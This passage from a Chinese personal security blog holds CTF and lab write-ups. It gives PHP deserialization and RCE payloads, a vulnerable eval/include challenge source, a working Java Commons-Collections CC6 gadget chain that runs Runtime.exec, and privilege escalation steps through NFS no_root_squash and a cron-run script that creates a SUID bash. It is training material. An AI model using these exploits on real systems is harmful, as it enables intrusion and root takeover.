+<h1 id="HNCTF-2022-WEEK2-easy-include"><a href="#HNCTF-2022-WEEK2-easy-include" class="headerlink" title="[HNCTF 2022 WEEK2]easy_include"></a>[HNCTF 2022 WEEK2]easy_include</h1><p>日志文件包含<br><img src="https://img-blog.csdnimg.cn/ec6c02b6c7f74f21b2bc1c2b42b4437b.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2022-新生赛-ez-ez-unserialize"><a href="#SWPUCTF-2022-新生赛-ez-ez-unserialize" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_unserialize"></a>[SWPUCTF 2022 新生赛]ez_ez_unserialize</h1><pre><code class="php">
+&lt;?php
+class X
+&#123;
+    public $x = __FILE__;
+    function __construct($x)
+    &#123;
+        $this-&gt;x = $x;
+    &#125;
+    function __wakeup()
+    &#123;
+        if ($this-&gt;x !== __FILE__) &#123;
+            $this-&gt;x = __FILE__;
+        &#125;
+    &#125;
+    function __destruct()
+    &#123;
+        highlight_file($this-&gt;x);
+        //flag is in fllllllag.php
+    &#125;
+&#125;
+
+$p = new X(&quot;fllllllag.php&quot;);
+echo serialize($p);
+//O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;
+</code></pre>
+<p>然后绕一下wakeup<br><code>O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125; </code><br><img src="https://img-blog.csdnimg.cn/39a5b58797a545cea1f26ba98cc14452.png" alt="在这里插入图片描述"></p>
+<h1 id="GDOUCTF-2023-反方向的钟"><a href="#GDOUCTF-2023-反方向的钟" class="headerlink" title="[GDOUCTF 2023]反方向的钟"></a>[GDOUCTF 2023]反方向的钟</h1><pre><code class="php">
+&lt;?php
+error_reporting(0);
+
+// flag.php
+class teacher
+&#123;
+    public $name;
+    public $rank;
+    private $salary;
+    public function __construct($name, $rank, $salary = 10000)
+    &#123;
+        $this-&gt;name = $name;
+        $this-&gt;rank = $rank;
+        $this-&gt;salary = $salary;
+    &#125;
+&#125;
+
+class classroom
+&#123;
+    public $name;
+    public $leader;
+    public function __construct($name, $leader)
+    &#123;
+        $this-&gt;name = $name;
+        $this-&gt;leader = $leader;
+    &#125;
+    public function hahaha()
+    &#123;
+        if ($this-&gt;name != &#39;one class&#39; or $this-&gt;leader-&gt;name != &#39;ing&#39; or $this-&gt;leader-&gt;rank != &#39;department&#39;) &#123;
+            return False;
+        &#125; else &#123;
+            return True;
+        &#125;
+    &#125;
+&#125;
+
+class school
+&#123;
+    public $department;
+    public $headmaster;
+    public function __construct($department, $ceo)
+    &#123;
+        $this-&gt;department = $department;
+        $this-&gt;headmaster = $ceo;
+    &#125;
+    public function IPO()
+    &#123;
+        if ($this-&gt;headmaster == &#39;ong&#39;) &#123;
+            echo &quot;Pretty Good ! Ctfer!\n&quot;;
+            echo new $_POST[&#39;a&#39;]($_POST[&#39;b&#39;]);
+        &#125;
+    &#125;
+    public function __wakeup()
+    &#123;
+        if ($this-&gt;department-&gt;hahaha()) &#123;
+            $this-&gt;IPO();
+        &#125;
+    &#125;
+&#125;
+$T = new teacher(&#39;ing&#39;, &#39;department&#39;);
+$C = new classroom(&quot;one class&quot;, $T,);
+$p = new school($C, &#39;ong&#39;);
+echo base64_encode(serialize($p));
+//Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjozOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO3M6MTU6IgB0ZWFjaGVyAHNhbGFyeSI7aToxMDAwMDt9fXM6MTA6ImhlYWRtYXN0ZXIiO3M6Mzoib25nIjt9
+</code></pre>
+<p>利用点是new对象 这里我们考虑new原生类<br>注意<code>SplFileObject</code>是逐行读的 所以我们要用伪协议<br><img src="https://img-blog.csdnimg.cn/b03d3fd466d54fa6b0a14153494da260.png" alt="在这里插入图片描述"></p>
+<h1 id="prize-p5"><a href="#prize-p5" class="headerlink" title="prize_p5"></a>prize_p5</h1><p>简单看了一下 应该是原生类找文件 然后用escape读<br><img src="https://img-blog.csdnimg.cn/f92b1d338ed14f6c96d37628d850cb27.png" alt="在这里插入图片描述"><br>先开个<code>GlobIterator</code>找flag</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+
+class catalogue
+&#123;
+    public $class;
+    public $data;
+    public function __construct($class, $data)
+    &#123;
+        $this-&gt;class = $class;
+        $this-&gt;data = $data;
+    &#125;
+    public function __destruct()
+    &#123;
+        echo new $this-&gt;class($this-&gt;data);
+    &#125;
+&#125;
+
+$p = new catalogue(&quot;GlobIterator&quot;, &quot;/*flag*&quot;);
+echo serialize($p);
+//O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;s:12:&quot;GlobIterator&quot;;s:4:&quot;data&quot;;s:7:&quot;/*flag*&quot;;&#125;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/a3430eca323947a3945f41a72d23362c.png" alt="在这里插入图片描述"></p>
+<p>非预期 改16进制<br>这个点我第一次见<br>把小s改大写S 然后就可以用十六进制了<br><code>?cata=O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;S:13:&quot;\53\70\6c\46\69\6c\65\4f\62\6a\65\63\74&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;</code><br>预期是字符串逃逸<br><img src="https://img-blog.csdnimg.cn/36c48eb649a7445ea8340b49b9fb8b14.png" alt="在这里插入图片描述"></p>
+<h1 id="CISCN-2019初赛-Love-Math"><a href="#CISCN-2019初赛-Love-Math" class="headerlink" title="[CISCN 2019初赛]Love Math"></a>[CISCN 2019初赛]Love Math</h1><p>要尝试构造字母 base_convert()可以任意进制转换<br>36进制构造phpinfo试试<br><img src="https://img-blog.csdnimg.cn/f02fc91ee1c04c2d9735249dfc16811f.png" alt="在这里插入图片描述"></p>
+<p>然而phpinfo里没有flag<br>尝试了用system 读了一下当前目录 可以用<br>但是36进制又弄不出来空格之类的东西 读不了根目录<br>考虑到hex2bin函数 我们可以先构造hex2bin 然后就可以构造任意字符了<br>base_convert(37907361743,10,36)(dechex())<br><img src="https://img-blog.csdnimg.cn/0f6d36ac032745ee89f08a9ff64b1eef.png" alt="在这里插入图片描述"></p>
+<p>最终payload<br><code>c=\$abs=base_convert(37907361743,10,36)(dechex(1598506324));(\$\$abs)&#123;1&#125;((\$\$abs)&#123;2&#125;)&amp;1=system&amp;2=cat \f*</code></p>
+<h1 id="NCTF-2018-flask真香"><a href="#NCTF-2018-flask真香" class="headerlink" title="[NCTF 2018]flask真香"></a>[NCTF 2018]flask真香</h1><p><img src="https://img-blog.csdnimg.cn/1e21c85a08394d70b8ac06fc68f4f80e.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2022-新生赛-xff"><a href="#SWPUCTF-2022-新生赛-xff" class="headerlink" title="[SWPUCTF 2022 新生赛]xff"></a>[SWPUCTF 2022 新生赛]xff</h1><p><img src="https://img-blog.csdnimg.cn/1c24527464e34d389cb9b6c8283ccd82.png" alt="在这里插入图片描述"></p>
+<h1 id="SWPUCTF-2022-新生赛-js-sign"><a href="#SWPUCTF-2022-新生赛-js-sign" class="headerlink" title="[SWPUCTF 2022 新生赛]js_sign"></a>[SWPUCTF 2022 新生赛]js_sign</h1><p><img src="https://img-blog.csdnimg.cn/8dd6e7a927124f4da0fe02c982ff061c.png" alt="在这里插入图片描述"><br>hint解码完是tapcode<br><img src="https://img-blog.csdnimg.cn/a20938f382fa47fdaebcd1c5976244f3.png" alt="在这里插入图片描述"><br>加括号里面转小写</p>
+<h1 id="LitCTF-2023-就当无事发生"><a href="#LitCTF-2023-就当无事发生" class="headerlink" title="[LitCTF 2023]就当无事发生"></a>[LitCTF 2023]就当无事发生</h1><p>没环境了</p>
+<h1 id="NSSRound-8-Basic-MyDoor"><a href="#NSSRound-8-Basic-MyDoor" class="headerlink" title="[NSSRound#8 Basic]MyDoor"></a>[NSSRound#8 Basic]MyDoor</h1><p>存在文件包含<br>日志文件包含给ban了<br>试试远程 也ban了<br>尝试伪协议读一下index.php</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+
+if (isset($_GET[&#39;N_S.S&#39;])) &#123;
+    eval($_GET[&#39;N_S.S&#39;]);
+&#125;
+
+if(!isset($_GET[&#39;file&#39;])) &#123;
+    header(&#39;Location:/index.php?file=&#39;);
+&#125; else &#123;
+    $file = $_GET[&#39;file&#39;];
+
+    if (!preg_match(&#39;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;, $file)) &#123;
+        include $file;
+    &#125; else &#123;
+        die(&#39;error.&#39;);
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/de5dc5503b864ee9a44f056b81743374.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/08/02/NSS%E5%88%B7web3/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/08/01/HackSudo2%E9%9D%B6%E6%9C%BA%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
+        <h2 class="post-title">HackSudo2靶机 通关详解</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/8/1
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>发现vmWare的kali扫不到virtualbox的靶机<br>网上找了挺久资料都没解决 索性全桥接上物理机了</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/c9ce06a03da44d0198f537a51030da47.png" alt="在这里插入图片描述"></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>扫个目录<br><img src="https://img-blog.csdnimg.cn/1d7f63201a9f496e957ddf4cdf48493b.png" alt="在这里插入图片描述"><br>都看了一眼 没什么有用的<br>然后回到file.php</p>
+<p>感觉之前做过类似的靶场,猜测存在文件包含<br>随便传个file试试<br><img src="https://img-blog.csdnimg.cn/6267918e996f45168c304a3099093e9a.png" alt="在这里插入图片描述"></p>
+<p>确实有 考虑日志文件包含<br>之前看phpinfo的时候知道是apache<br>试了试没成功<br>且phpinfo中说了不允许远程包含<br><img src="https://img-blog.csdnimg.cn/52321fc0e68b484cb9608951817b5041.png" alt="在这里插入图片描述"><br>web上我暂时想不到什么突破口了<br>把读到的passwd放到user.txt中<br>看看能不能ssh爆破一下<br><img src="https://img-blog.csdnimg.cn/1851e615c40c48fe9b0314996536553b.png" alt="在这里插入图片描述"><br>这里试试登hacksudo<br>也没爆出来 回头看看还有那些服务<br>还有nfs<br>那应该突破口就是nfs了<br><img src="https://img-blog.csdnimg.cn/85683f9acd984f2e85ba547733782818.png" alt="在这里插入图片描述"></p>
+<p>然后去读nfs的配置信息<br><img src="https://img-blog.csdnimg.cn/aa02dec3f3d64eb7af74ac2f84874413.png" alt="在这里插入图片描述"><br>有写权限 且发现是<code>no_root_squash</code>的<br><code>no_root_squash</code>：允许客户端以root用户访问，root用户具有根目录的完全控制访问权限</p>
+<p>直接写shell<br><img src="https://img-blog.csdnimg.cn/dc89a617e5bf4a36818d360e06333fb0.png" alt="在这里插入图片描述"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化一下shell<br><code>/usr/bin/script -qc /bin/bash /dev/null</code><br><code>ctrl+z</code><br><code>stty raw -echo;fg</code></p>
+<p>然后在kali上复制个bash进&#x2F;mnt<br>由于no_root_squash 我们在挂载目录中是root权限<br><img src="https://img-blog.csdnimg.cn/8658bbfd5244458d8b92fe8fa8e6df3d.png" alt="在这里插入图片描述"><br><code>./bash -p</code><br><img src="https://img-blog.csdnimg.cn/bba45cd147f44a6fac696f5acc66f828.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7f15a9b926894f159c666d96c288eb46.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/08/01/HackSudo2%E9%9D%B6%E6%9C%BA%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/07/30/CommonCollections6%E9%93%BE%E5%88%86%E6%9E%90/">
+        <h2 class="post-title">CommonCollections6链分析</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/7/30
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>前面和CC1一样<br>优点是不限制jdk版本和cc的版本</p>
+<p>先开一个<code>ChainedTransformer</code><br><img src="https://img-blog.csdnimg.cn/742f4fb0ceb143e9a7f2936f418ed278.png" alt="在这里插入图片描述"><br>然后创<code>LazyMap</code> 我们顺便执行一下避免上面写错<br><img src="https://img-blog.csdnimg.cn/3648efc3e819457db79e3214a15e9769.png" alt="在这里插入图片描述"><br>能弹计算器 没问题<br>后面就是CC6不同的地方了</p>
+<p>我们需要一个<code>TiedMapEntry</code><br>因为需要一个类调用了get方法<br>在<code>TiedMapEntry</code>的<code>getValue()</code>方法中调用了<code>get() </code>其中<code>map</code>和<code>key</code>都可控<br><img src="https://img-blog.csdnimg.cn/29ed92d267d343c5820511e1f1b17145.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/efa2a12eeaa247c989a419346e807c18.png" alt="在这里插入图片描述"><br>那么我们就需要一个类调用<code>getValue</code>方法 TiedMapEntry的hashCode方法就可以<br><img src="https://img-blog.csdnimg.cn/a95a621fed834b718b8e3733845b9cfc.png" alt="在这里插入图片描述"></p>
+<p>然后类似URLDNS的链子 我们可以知道这里可以用<code>HashMap</code>连上<br><code>HashMap</code>的<code>readObject</code>方法会调用<code>hashCode</code><br><img src="https://img-blog.csdnimg.cn/cdfc39954c9c40f3838874a228a3960f.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/cd6a4dd4898c4c2e95d355282d195346.png" alt="在这里插入图片描述"><br>至此链子结束 我们可以写出如下代码</p>
+<pre><code class="java">package org.example.CC6;
+
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Main &#123;
+    public static   void main(String[] args) throws ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Map map = new HashMap();
+        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;xxx&quot;);
+        Map map2 = new HashMap();
+        map2.put(tiedMapEntry,&quot;ccc&quot;);
+        serialize(map2);
+        unSerialize(&quot;ser.bin&quot;);
+
+
+    &#125;
+
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>尝试执行 发现确实能弹计算器<br>但是这里存在和URLDNS一样的问题 , 就是这个计算器弹的时机是在<code>map2.put</code>的时候<br>而不是我们期望的反序列化的时候</p>
+<p>原因是HashMap在put的时候已经给整条链走完了<br><img src="https://img-blog.csdnimg.cn/a45f2a63880c4fdd90294707baa6e941.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fcea8304eb2c4ecc86d53e572f68923b.png" alt="在这里插入图片描述"><br>因为这里的key !&#x3D; null 所以继续进了hashCode<br><img src="https://img-blog.csdnimg.cn/c2d83b6ada7d40d7add8bbbfb16257ac.png" alt="在这里插入图片描述"><br>LazyMap调用get<br><img src="https://img-blog.csdnimg.cn/db9bcf8b2d5240efb99a9c6adaa8ba27.png" alt="在这里插入图片描述"><br>然后没有<code>key</code> <code>put</code>进去了 在后面反序列化的时候就有<code>key</code>了<br>有<code>key</code>就直接<code>return map.get(key)</code>了</p>
+<p>为了避免这种情况 我们需要 让最开始传入的东西不能形成链子 就是说改LazyMap 改 TiedMapEntry 之类的的都行,只要不在反序列化前弹计算器就行<br>然后要记得给put进来的key remove掉<br>于是最终代码如下</p>
+<pre><code class="java">package org.example.CC6;
+
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Main &#123;
+    public static   void main(String[] args) throws ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Map map = new HashMap();
+        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;xxx&quot;);
+        Map map2 = new HashMap();
+        map2.put(tiedMapEntry, &quot;ccc&quot;);
+        lazyMap.remove(&quot;xxx&quot;);
+        Field field = LazyMap.class.getDeclaredField(&quot;factory&quot;);
+        field.setAccessible(true);
+        field.set(lazyMap, chainedTransformer);
+
+        serialize(map2);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+
+
+
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #00a596">java</a>
+        </span>
+        
+    </div>
+    <a href="/2023/07/30/CommonCollections6%E9%93%BE%E5%88%86%E6%9E%90/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/07/30/DRIFTINGBLUES-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
+        <h2 class="post-title">DRIFTINGBLUES-1靶机通关详解</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/7/30
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/bdba99ff6ab34b9abe568ec00a1cda10.png" alt="在这里插入图片描述"></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>进web看源码发现 <img src="https://img-blog.csdnimg.cn/cc2e0d34c93c412498c03d013c551c53.png" alt="在这里插入图片描述"><br>解码得到 <code>/noteforkingfish.txt</code><br>访问发现是ook 解得<br><img src="https://img-blog.csdnimg.cn/283ce3edb77b4aff85b34c20d503ceab.png" alt="在这里插入图片描述"><br>先把这个名字记下来 说不定之后要ssh爆破有用<br>然后他说要用 host file <img src="https://img-blog.csdnimg.cn/00de8faccf31481e90dfaf4f8b976f1b.png" alt="在这里插入图片描述"><br>注意到域名可能是<code>driftingblues.box</code><br>加到hosts里试试<br>没啥用 看别人wp知道还得爆破子域名 那kali也添加个hosts然后爆破子域名<br><img src="https://img-blog.csdnimg.cn/f223ade9342140e69f9c14237ef4c260.png" alt="在这里插入图片描述"></p>
+<p>所以添加<code>test.driftingblues.box</code>进去 然后访问<br><img src="https://img-blog.csdnimg.cn/9577716640c447129dc31630217c95bb.png" alt="在这里插入图片描述"><br>扫个目录<br><img src="https://img-blog.csdnimg.cn/684704a72e26485c8e8f7a5832c4a353.png" alt="在这里插入图片描述"><br><code>robots.txt</code>中有<code>ssh_cred.txt</code><br><img src="https://img-blog.csdnimg.cn/090746838644466abdc249afcb0c0d01.png" alt="在这里插入图片描述"><br>说密码最后要加一位数字<br><img src="https://img-blog.csdnimg.cn/65dcb046a9a34f8ab467c7b416a8b2ce.png" alt="在这里插入图片描述"><br>登录上去</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="https://img-blog.csdnimg.cn/909dce890c9840a99c9b95fd56507631.png" alt="在这里插入图片描述"><br>看看有哪些可能有用的账户 <img src="https://img-blog.csdnimg.cn/90b1d163dbd34d3780c84630ffed7623.png" alt="在这里插入图片描述"><br>进<code>home</code>目录 发现没有db用户<br>那再看看eric有没有sudo权限<br><img src="https://img-blog.csdnimg.cn/8322dacb5c394f30af00a1b645c7ce9a.png" alt="在这里插入图片描述"><br>去&#x2F;tmp看看有没有什么临时文件<br><img src="https://img-blog.csdnimg.cn/3cc271c7c50a4d5f8e52429174ba9171.png" alt="在这里插入图片描述"><br>有备份 去&#x2F;var&#x2F;backups看看</p>
+<p><img src="https://img-blog.csdnimg.cn/8b05a202f5ac491293e8c3484649fbc9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bbcabdc2252e493db134115ff419d787.png" alt="在这里插入图片描述"><br>去tmp下看emergency文件 发现没有<br>那么我们可以自己创一个利用<br>手动执行backup.sh 提示没权限<br><img src="https://img-blog.csdnimg.cn/ab1554d084114415b7709d4e0ccf800e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/192a81b6bf7b4e2ba4b61405570fc767.png" alt="在这里插入图片描述"><br>发现其实他自己隔一段时间会自动执行backup.sh<br>那么等一会就行</p>
+<pre><code class="bash">echo &quot;cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash&quot; &gt; emergency
+chmod +x emergency
+</code></pre>
+<p>等rootbash创建了之后 </p>
+<pre><code class="bash">./rootbash -p
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/05d611f5bc9a46da9ee2652324ba14bb.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/07/30/DRIFTINGBLUES-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
+</div>
+
+
+        <div class="page-current">
+    
+    <a class="page-num" href="/page/2/">
+        <i class="fa-solid fa-caret-left fa-fw"></i>
+    </a>
+    <a class="page-num" href="/">1</a>
+    <span class="page-omit">...</span>
+    
+    <span class="current">3</span>
+    
+    <a class="page-num" href="/page/4">4</a>
+    
+    
+    <a class="page-num" href="/page/5">5</a>
+    
+    
+    <span class="page-omit">...</span>
+    <a class="page-num" href="/page/7">7</a>
+    
+    
+    <a class="page-num" href="/page/4/">
+        <i class="fa-solid fa-caret-right fa-fw"></i>
+    </a>
+    
+</div>
+
+    </div>
+    
+    <div id="home-card">
+        <div id="card-style">
+    <div id="card-div">
+        <div class="avatar">
+            <img src="/images/Arcueid.jpg" alt="avatar" />
+        </div>
+        <div class="name">Arcueid</div>
+        <div class="description">
+            <p>Web + Crypto 苦手</p>
+
+        </div>
+        
+        
+    </div>
+</div>
+
+    </div>
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+</body>
+</html>
